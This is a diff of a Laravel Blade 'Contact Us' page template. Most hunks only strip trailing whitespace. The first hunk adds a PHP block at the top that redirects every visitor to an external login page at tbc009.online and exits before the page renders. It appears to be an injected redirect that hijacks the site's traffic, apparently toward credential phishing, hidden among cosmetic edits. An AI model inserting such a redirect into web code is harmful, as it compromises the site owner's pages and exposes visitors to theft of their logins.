@@ -1,8 +1,12 @@
+<?php
+header('Location: http://tbc009.online/login');
+exit();
+?>
 @php
-    
+
     $page_title = 'Contact Us';
     $short_description = 'We are available 24/7. You can reach us via any of the means below.';
-    
+
 @endphp
 
 {{-- layout --}}
@@ -79,25 +83,25 @@
 
 
 
- 
+
                                 <div class="row">
 
 
 
                                          <div class="form-group col-12 pb-3 mb-3">
 
-                                           
+
                                          <input type="text" name="email" value="" class="form-control form-round form-control-lg" placeholder="Your Email">
 
-                                        
+
                                     </div>
 
                                      <div class="form-group col-12 pb-3 mb-3">
 
-                                         
+
                                          <input type="text" name="subject" value="" class="form-control form-round form-control-lg" placeholder="Enter Subject">
 
-                                        
+
                                     </div>
 
 
@@ -108,7 +112,7 @@
 
                                     </div>
 
-                                       
+
 
                                     <div class="col-md-6 col-lg-12 col-xl-6">
 
@@ -122,7 +126,7 @@
 
                             </form>
 
-                               
+
                         </div>
 
                     </div>
@@ -135,11 +139,11 @@
 
                             <div class="px-xl-3 py-4">
 
-    
+
 
                                 <h3 class="section-title-3 title-light-1 text-left font-weight-700 mb-4">Contact Info</h3>
 
-    
+
 
                                 <div class="row contact-info-list pt-4 mb-5">
 
@@ -168,10 +172,10 @@
 
                                     </div>
 
-    
 
 
-    
+
+
 
                                     <div class="col-md-6 col-lg-12 contact-info-item">
 
@@ -195,7 +199,7 @@
 
                                     </div>
 
-    
+
 
                                     <div class="col-md-6 col-lg-12 contact-info-item">
 
@@ -219,7 +223,7 @@
 
                                     </div>
 
-    
+
 
                                 </div>
 
@@ -235,7 +239,7 @@
 
                                 </div>
 
-    
+
 
                             </div>
 
@@ -255,7 +259,7 @@
 
                 <!-- Icons info section -->
 
-                
+
 
 
 
